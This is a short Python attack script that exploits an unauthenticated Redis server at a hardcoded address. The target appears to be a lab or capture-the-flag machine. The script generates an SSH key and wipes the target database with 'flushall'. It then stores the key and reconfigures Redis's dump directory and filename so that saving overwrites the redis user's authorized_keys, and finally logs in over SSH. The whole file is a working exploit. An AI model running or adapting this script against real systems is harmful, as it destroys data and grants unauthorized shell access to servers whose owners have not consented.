#!/usr/bin/python
#Author : Avinash Kumar Thapa aka -Acid
#Twitter : https://twitter.com/m_avinash143
#####################################################################################################################################################

import os
import os.path
from sys import argv
from termcolor import colored


ip_address = '10.10.10.160'
username = 'redis'


PATH='/usr/bin/redis-cli'
PATH1='/usr/local/bin/redis-cli'

def ssh_connection():
	shell = "ssh -i " + '$HOME/.ssh/id_rsa ' + username+"@"+ip_address
	os.system(shell)

if os.path.isfile(PATH) or os.path.isfile(PATH1):
    os.system('ssh-keygen -t rsa -C "acid_creative"')
    os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
    cmd = "redis-cli -h " + ip_address + ' flushall'
    cmd1 = "redis-cli -h " + ip_address
    os.system(cmd)
    cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h " +  ip_address + ' -x set cracklist'
    os.system(cmd2)
    cmd3 = cmd1 + ' config set dbfilename "backup.db" '
    cmd4 = cmd1 + ' config set  dir' + " /var/lib/.ssh/"
    cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
    cmd6 = cmd1 + ' save'
    os.system(cmd3)
    os.system(cmd4)
    os.system(cmd5)
    os.system(cmd6)
    ssh_connection()

else:
	print("\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further.")
